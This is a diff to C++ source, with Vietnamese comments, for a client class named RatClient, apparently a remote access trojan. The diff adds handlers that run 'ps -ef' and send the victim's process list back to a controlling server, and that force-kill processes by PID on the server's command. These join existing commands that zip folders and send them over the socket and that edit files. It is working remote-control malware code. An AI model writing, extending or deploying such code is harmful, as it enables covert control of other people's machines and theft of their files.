@@ -303,6 +303,65 @@ void FileManager::HandleDownloadDir(const std::string& foldername) {
     std::cout << "[+] Da nén va gui xong folder qua socket!\n";
 }
 
+class ProcessManager {
+public:
+    SocketClient client;
+    void HandleProcessList();
+    void HandleKillProcess(const std::string& pid);
+};
+
+// Hàm chạy lệnh hệ thống "ps -ef" và gửi kết quả về Server
+void ProcessManager::HandleProcessList() {
+    char buffer[512]; // Tăng buffer lên một chút vì một dòng ps -ef có thể dài
+    std::string result = "\n=== DANH SACH TIEN TRINH CLIENT (ps -ef) ===\n\n";
+    
+    // Gọi lệnh hệ thống ps -ef qua pipe
+    FILE* pipe = popen("ps -ef", "r");
+    if (!pipe) {
+        std::string errorMsg = "ERROR: Khong the thuc thi lenh xem tien trinh.\n";
+        client.Send(errorMsg);
+        return;
+    }
+
+    // Đọc dữ liệu từ pipe và nối vào chuỗi kết quả
+    while (fgets(buffer, sizeof(buffer), pipe) != nullptr) {
+        result += buffer;
+    }
+
+    pclose(pipe);
+
+    // Gửi toàn bộ danh sách tiến trình về Server
+    client.Send(result);
+    std::cout << "[+] Da gui danh sach tien trinh (ps -ef) ve Server.\n";
+}
+
+// Hàm xử lý lệnh tắt tiến trình bằng PID
+void ProcessManager::HandleKillProcess(const std::string& pid) {
+    // Kiểm tra chuỗi PID hợp lệ (tránh việc truyền ký tự lạ gây lỗi lệnh hệ thống)
+    if (pid.empty() || pid.find_first_not_of("0123456789") != std::string::npos) {
+        std::string msg = "ERROR: PID khong hop le (phai la so nguyen).\n";
+        client.Send(msg);
+        return;
+    }
+
+    std::cout << "[*] Dang thuc hien kill PID: " << pid << "...\n";
+    
+    // Lệnh kill -9 buộc dừng tiến trình ngay lập tức trên Linux
+    std::string killCmd = "kill -9 " + pid;
+    
+    int res = system(killCmd.c_str());
+    
+    std::string statusMsg;
+    if (res == 0) {
+        statusMsg = "SUCCESS: Da tat tien trinh " + pid + " thanh cong.\n";
+    } else {
+        statusMsg = "ERROR: Khong the tat tien trinh " + pid + " (Co the sai PID hoac thieu quyen root).\n";
+    }
+
+    // Gửi báo cáo trạng thái về cho Server
+    client.Send(statusMsg);
+}
+
 
 
 class RatClient {
@@ -312,6 +371,7 @@ public:
 private:
     SocketClient client;
     FileManager fileManager;
+    ProcessManager processManager;
 
     void InitClientSocket();
     void Listen();
@@ -384,6 +444,13 @@ void RatClient::HandleCommand(const std::string& command) {
     else if (command.rfind("GETDIR ", 0) == 0) {
         std::string foldername = command.substr(7);
         fileManager.HandleDownloadDir(foldername);
+    }
+    else if (command == "PS") { // Lệnh mới cho xem Process
+        processManager.HandleProcessList();
+    }
+    else if (command.rfind("KILL ", 0) == 0) { // Thêm nhánh xử lý lệnh KILL
+        std::string pid = command.substr(5); // Cắt lấy phần chuỗi số PID sau chữ "KILL "
+        processManager.HandleKillProcess(pid);
     }
     else if (command.rfind("EDITFILE ", 0) == 0) { // Thêm nhánh xử lý lệnh EDITFILE
         std::string filename = command.substr(9);
